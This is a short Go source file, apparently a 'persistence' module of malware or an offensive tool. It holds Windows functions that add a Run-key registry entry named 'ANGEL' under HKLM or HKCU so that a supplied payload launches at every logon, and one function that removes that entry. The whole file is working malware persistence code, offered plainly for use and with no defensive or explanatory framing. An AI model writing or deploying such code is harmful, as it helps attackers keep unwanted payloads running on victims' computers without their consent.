//go:build windows

package persistence

import (
"os/exec"
)

func RegistryPersist(payloadPath string) bool {
cmd := exec.Command("cmd", "/c", "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v ANGEL /t REG_SZ /d \""+payloadPath+"\" /f")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func RegistryPersistHKCU(payloadPath string) bool {
cmd := exec.Command("cmd", "/c", "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v ANGEL /t REG_SZ /d \""+payloadPath+"\" /f")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func RegistryDelete() bool {
cmd := exec.Command("cmd", "/c", "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v ANGEL /f")
err := cmd.Run()
if err != nil {
return false
}
return true
}
